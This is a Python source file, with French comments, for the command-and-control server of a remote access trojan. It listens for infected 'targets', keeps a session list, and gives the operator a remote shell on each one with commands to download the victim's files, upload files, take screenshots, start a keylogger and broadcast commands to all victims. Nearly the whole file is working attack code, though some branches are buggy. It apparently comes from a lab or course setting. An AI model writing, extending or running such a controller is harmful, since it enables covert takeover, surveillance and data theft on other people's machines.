#!/usr/bin/python3

import socket
import json
import os
import base64
import threading


def server():
    while True:
        if stop_threads:
            break
        # on laisse 1 seconde pour faire l'operation sinon erreur
        s.settimeout(1)
        try:
            target, ip = s.accept()
            targets_socket.append(target)
            queue_ips.append(ip)
            print(str(targets_socket[ len(targets_socket) -1 ]) + "---" + 
                    str(queue_ips[len(queue_ips) -1 ]))
        except:
            pass


def displayQueueIps(queue_ips):
    count = 0
    for ip in queue_ips:
        print("Session {} <----> {}".format(str(count), str(ip)))
        count += 1

def closeEachTargetsConnection(targets_sockets):
    for target_socket in targets_sockets:
        target_socket.close()


def callShellForAClient(command):
    try:
        index_session = int(command[8])
        target_socket = targets_socket[index_session]
        target_ip = queue_ips[index_session]
        shell(target_socket, target_ip, targets_socket, queue_ips)
    except:
        print("No sessions under that number")

def reliableSendToAllTargets(data, targets_socket):
    if type(data) is not bytes:
        json_data = json.dumps(data)
    else:
        json_data = json.dumps(data.decode('utf-8'))

    print("on passe la")

    for i in range(len(targets_socket)):
        print(targets_socket[i])
        targets_socket[i].send(json_data.encode())


def reliable_send(data, target):
    if type(data) is not bytes:
        json_data = json.dumps(data)
    else:
        json_data = json.dumps(data.decode('utf-8'))
    print("envoi de -> {}".format(data))
    target.send(json_data.encode())


def reliable_recv_image(target):
    data = b""
    BUFF_SIZE = 4096
    while True:
        
        data_recv = target.recv(BUFF_SIZE)
        data += data_recv
        if len(data_recv) < BUFF_SIZE:
            break
    return data


def reliable_recv(target):
    data = ""
    while True:
        try:
            data_recv = target.recv(1024).decode('utf-8')
            print(data_recv)
            data = data + data_recv
            return json.loads(data)
        except ValueError:
            continue

def concatenateUploadMessageAndFileUploadContent(command, content):
    return command + " | " + content


def shell(target, ip, targets_socket, queue_ips):
    count_screen = 1
    while True:
        command = input("Shell#~{}:".format(ip))
        print("command -> {}".format(command))
        if command == 'q':
            break
        elif command == 'exit':
            target.close()
            targets_socket.remove(target)
            queue_ips.remove(ip)
            break
        elif len(command) > 1 and command[:2] == "cd":
            reliable_send(commandi, target)
            #ça veut dire qu'on veut changer de fichier donc il ne faut as attendre de réponse
            continue
        elif len(command) > 1 and command[:8] == "download":
            reliable_send(command, target)
            # ici on va avoir la possibilité de download un file
            with open(command[9:], "wb") as file:
                file_data = reliable_recv(target)
                print("file_data -> {}".format(file_data))
                file.write(file_data.encode())
        elif len(command) > 1 and command[:6] == "upload":
            # pour la partie upload
            print("je suis dans la partie upload")
            #try:
            with open(command[7:], "rb") as file:
                command_file_content = concatenateUploadMessageAndFileUploadContent(command, file.read().decode('utf-8'))
                print("file_content -> {}".format(command_file_content))
                reliable_send(command_file_content, target)
                print("apres l'envoi du content")
            #except:
            #    reliable_send("Faiiled to Upload")
        elif len(command) > 1 and command[:10] == "screenshot":
           reliable_send(command, target)
           with open("screenshot{}.png".format(count_screen), "wb") as screen:
                image = reliable_recv_image(target)
                if image[:3] == "[-]":
                    print("Error -> {}".format(image))
                else:
                    print(image)
                    screen.write(image)
                    count_screen += 1
        elif len(command) > 1 and command[:12] == "keylog_start":
            reliable_send(command, target)
        else:
            reliable_send(command, target)
            message = reliable_recv(target)
            print(message)

global s
queue_ips = []
targets_socket = []
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("10.0.2.15", 54321))
s.listen(5)

stop_threads = False

thread_manager = threading.Thread(target=server)
thread_manager.start()
print("[+] Waiting for Targets to connect ...")
while True:
    command = input("* Center:")
    if command == "targets":
        displayQueueIps(queue_ips)

    elif command[:7] == "session":
       callShellForAClient(command)

    elif command == "exit":
        closeEachTargetsConnection(targets_socket)
        s.close()
        stop_threads = True
        thread_manager.join()
        break
    elif len(command) > 1 and command[:7] == "sendall":
        try:
            print('on passe dans le sendall')
            reliableSendToAllTargets(command, targets_socket)
        except:
            print("[!!] Failed To Send Command To All Targets")
    else:
        print("[!!] Command doesn't exist")
